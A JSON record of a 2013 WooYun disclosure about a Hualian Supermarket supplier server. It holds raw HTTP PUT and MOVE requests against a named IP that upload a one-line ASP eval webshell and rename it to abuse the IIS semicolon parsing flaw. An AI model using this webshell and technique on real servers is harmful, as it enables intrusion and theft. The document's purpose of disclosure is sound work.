{"id": 10795, "wybug_id": "wooyun-2013-026906", "wybug_title": "华联超市某站危险方法导致任意文件上传,已shell", "wybug_corp": "华联超市", "wybug_author": "霍大然", "wybug_date": "2013-06-26 10:26", "wybug_open_date": "2013-08-10 10:26", "wybug_type": "应用配置错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["配置错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-08-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 华联超市股份有限公司是中国国内第一家上市的连锁超市公司，其前身为成立于1993年1月的上海华联超市公司。本漏洞出现在华联超市供应商系统中，导致供应商信息泄露。 详细说明：  由于IIS配置不当，开放put、move方法，导致文件上传，并且可move为jpg文件，利用IIS解析漏洞可执行上传文件。在测试过程中出现了个小插曲，只能put txt文件，不能move为asp文件，后来发现可以move为jpg文件。目标地址：218.204.14.84请求：PUT /te.txt HTTP/1.1Host: 218.204.14.84Content-Length: 30<%eval request(\"testtest\")%>返回：HTTP/1.1 201 CreatedDate: Tue, 25 Jun 2013 14:01:47 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETLocation: http://218.204.14.84/te.txtContent-Length: 0Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK请求：MOVE /te.txt HTTP/1.1Host: 218.204.14.84Destination: http://218.204.14.84/sh.asp;.jpg返回：HTTP/1.1 201 CreatedDate: Tue, 25 Jun 2013 13:59:03 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETLocation: http://218.204.14.84/sh.asp;.jpgContent-Type: text/xmlContent-Length: 0上传上去后直接上菜刀\n\n   漏洞证明：  \n\n   修复方案：  好多漏洞，都不知道咋补   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}